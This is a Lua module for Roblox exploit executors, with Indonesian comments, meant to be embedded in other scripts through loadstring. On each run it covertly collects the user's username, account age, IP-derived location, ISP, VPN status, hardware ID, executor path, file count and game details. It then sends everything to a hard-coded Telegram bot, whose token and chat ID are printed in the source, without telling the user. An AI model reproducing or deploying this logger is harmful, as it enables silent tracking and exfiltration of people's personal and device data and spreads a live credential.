--[[
    VertictHub - Universal Telegram Logger
    by @Bimz19

    CARA PAKAI:
    local TeleLogger = loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/bbimzz7/log/refs/heads/main/tele_logger.lua"
    ))()
    TeleLogger.Send("Nama Script")

    DENGAN INFO TAMBAHAN:
    TeleLogger.Send("Nama Script", {
        ["Versi"]     = "v1.0.0",
        ["Auto Play"] = "ON",
    })
]]

local TeleLogger = {}

--------------------------------------------------
-- CONFIG
--------------------------------------------------

local BOT_TOKEN = "8672141972:AAGl0yGh16if3rm2EfplYfkruGLPwaW0bP4"
local CHAT_ID   = "5488313125"

--------------------------------------------------
-- SERVICES
--------------------------------------------------

local Players     = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

--------------------------------------------------
-- HELPER FUNCTIONS
--------------------------------------------------

-- Lokasi dari IP dengan fallback
local function getLocation()
    local ok, result = pcall(function()
        local res = request({ Url = "http://ip-api.com/json/?fields=status,city,countryCode,isp,proxy,hosting,timezone", Method = "GET" })
        return HttpService:JSONDecode(res.Body)
    end)

    if ok and result and result.status == "success" then
        local isVPN = (result.proxy or result.hosting) and "Ya" or "Tidak"
        return result.city .. ", " .. result.countryCode,
               result.isp,
               result.timezone,
               isVPN
    end

    -- Fallback ke ipinfo.io
    local ok2, result2 = pcall(function()
        local res = request({ Url = "https://ipinfo.io/json", Method = "GET" })
        return HttpService:JSONDecode(res.Body)
    end)

    if ok2 and result2 then
        return (result2.city or "Unknown") .. ", " .. (result2.country or "Unknown"),
               result2.org or "Unknown",
               result2.timezone or "Unknown",
               "Unknown"
    end

    return "Unknown", "Unknown", "Unknown", "Unknown"
end

-- Executor name + versi
local function getExecutor()
    local name, ver = "Unknown", "Unknown"
    if identifyexecutor then
        local n, v = identifyexecutor()
        name = n or "Unknown"
        ver  = v or "Unknown"
    elseif getexecutorname then
        name = getexecutorname() or "Unknown"
    end
    return ver ~= "Unknown" and (name .. " v" .. ver) or name
end

-- HWID
local function getHWID()
    if getdeviceid then
        local ok, id = pcall(getdeviceid)
        if ok and id then return tostring(id) end
    end
    if gethwid then
        local ok, id = pcall(gethwid)
        if ok and id then return tostring(id) end
    end
    return "Tidak tersedia"
end

-- Platform
local function getPlatform()
    local UIS = game:GetService("UserInputService")
    if UIS.TouchEnabled and not UIS.KeyboardEnabled then
        return "Mobile"
    elseif UIS.GamepadEnabled and not UIS.KeyboardEnabled then
        return "Console"
    else
        return "PC"
    end
end

-- Resolusi layar
local function getResolution()
    local ok, result = pcall(function()
        local vp = workspace.CurrentCamera.ViewportSize
        return math.floor(vp.X) .. "x" .. math.floor(vp.Y)
    end)
    return ok and result or "Unknown"
end

-- FPS saat ini
local function getFPS()
    local ok, result = pcall(function()
        return math.floor(1 / game:GetService("RunService").Heartbeat:Wait())
    end)
    return ok and (tostring(result) .. " fps") or "Unknown"
end

-- GPU / Renderer
local function getGPU()
    local ok, result = pcall(function()
        return settings().Rendering.GfxCard
    end)
    return ok and result or "Unknown"
end

-- Roblox client versi
local function getRobloxVersion()
    local ok, result = pcall(function()
        return tostring(game:GetService("RbxAnalyticsService"):GetClientVersion())
    end)
    return ok and result or "Unknown"
end

-- Executor workspace path
local function getExecutorPath()
    local ok, result = pcall(function()
        if getscriptname then return getscriptname() end
        if readfile then
            -- coba tulis file test buat tau path
            writefile("__path_test__.txt", "test")
            local files = listfiles("")
            for _, f in ipairs(files) do
                if f:find("__path_test__") then
                    deletefile("__path_test__.txt")
                    return f:gsub("__path_test__.txt", "")
                end
            end
            deletefile("__path_test__.txt")
        end
        return "Tidak tersedia"
    end)
    return ok and result or "Tidak tersedia"
end

-- Jumlah file di workspace executor
local function getWorkspaceFileCount()
    local ok, result = pcall(function()
        if listfiles then
            local files = listfiles("")
            return tostring(#files) .. " file"
        end
        return "Tidak tersedia"
    end)
    return ok and result or "Tidak tersedia"
end

-- Account age
local function getAccountAge()
    local ok, result = pcall(function()
        local res  = game:HttpGet("https://users.roblox.com/v1/users/" .. LocalPlayer.UserId)
        local data = HttpService:JSONDecode(res)
        local y, m, d = data.created:match("(%d+)-(%d+)-(%d+)")
        local createdTime = os.time({
            year = tonumber(y), month = tonumber(m), day = tonumber(d),
            hour = 0, min = 0, sec = 0
        })
        return math.floor(os.difftime(os.time(), createdTime) / 86400) .. " hari"
    end)
    return ok and result or "Unknown"
end

-- Jumlah teman
local function getFriendCount()
    local ok, result = pcall(function()
        local res = game:HttpGet(
            "https://friends.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/friends/count"
        )
        return HttpService:JSONDecode(res).count
    end)
    return ok and tostring(result) or "Unknown"
end

-- Nama game
local function getGameName()
    local ok, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    return ok and result or "Unknown"
end

-- Player count
local function getPlayerCount()
    return #Players:GetPlayers() .. "/" .. Players.MaxPlayers
end

-- Ping
local function getPing()
    return math.floor(LocalPlayer:GetNetworkPing() * 1000) .. " ms"
end

-- Umur server
local function getServerAge()
    local s = math.floor(workspace.DistributedGameTime)
    return math.floor(s / 60) .. " menit " .. (s % 60) .. " detik"
end

--------------------------------------------------
-- SEND FUNCTION
--------------------------------------------------

function TeleLogger.Send(scriptName, extraInfo)
    task.spawn(function()
        task.wait(3)

        local city, isp, timezone, isVPN = getLocation()

        local extraStr = ""
        if extraInfo then
            extraStr = "\n= INFO TAMBAHAN =\n"
            for k, v in pairs(extraInfo) do
                extraStr = extraStr .. string.format("%-13s: %s\n", k, tostring(v))
            end
        end

        local msg = string.format(
            "[%s - User Detected]\n\n" ..

            "= DATA USER =\n" ..
            "Username     : %s\n" ..
            "User ID      : %d\n" ..
            "Display Name : %s\n" ..
            "Account Age  : %s\n" ..
            "Teman        : %s\n" ..
            "Lokasi       : %s\n" ..
            "ISP          : %s\n" ..
            "VPN/Proxy    : %s\n\n" ..

            "= DEVICE INFO =\n" ..
            "Platform     : %s\n" ..
            "Resolusi     : %s\n" ..
            "FPS          : %s\n" ..
            "GPU          : %s\n" ..
            "Roblox Ver   : %s\n" ..
            "HWID         : %s\n" ..
            "Executor     : %s\n" ..
            "Exec Path    : %s\n" ..
            "Files        : %s\n\n" ..

            "= DATA GAME =\n" ..
            "Game         : %s\n" ..
            "Place ID     : %d\n" ..
            "Job ID       : %s\n" ..
            "Player       : %s\n" ..
            "Ping         : %s\n" ..
            "Umur Server  : %s\n\n" ..

            "= DATA SCRIPT =\n" ..
            "Script       : %s\n" ..
            "%s\n" ..

            "= WAKTU =\n" ..
            "Tanggal      : %s\n" ..
            "Jam          : %s\n" ..
            "Timezone     : %s",

            scriptName,

            -- User
            LocalPlayer.Name,
            LocalPlayer.UserId,
            LocalPlayer.DisplayName,
            getAccountAge(),
            getFriendCount(),
            city, isp, isVPN,

            -- Device
            getPlatform(),
            getResolution(),
            getFPS(),
            getGPU(),
            getRobloxVersion(),
            getHWID(),
            getExecutor(),
            getExecutorPath(),
            getWorkspaceFileCount(),

            -- Game
            getGameName(),
            game.PlaceId,
            game.JobId,
            getPlayerCount(),
            getPing(),
            getServerAge(),

            -- Script
            scriptName,
            extraStr,

            -- Waktu
            os.date("%Y-%m-%d"),
            os.date("%H:%M:%S"),
            timezone
        )

        pcall(function()
            request({
                Url     = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode({
                    chat_id = CHAT_ID,
                    text    = msg,
                })
            })
        end)
    end)
end

return TeleLogger
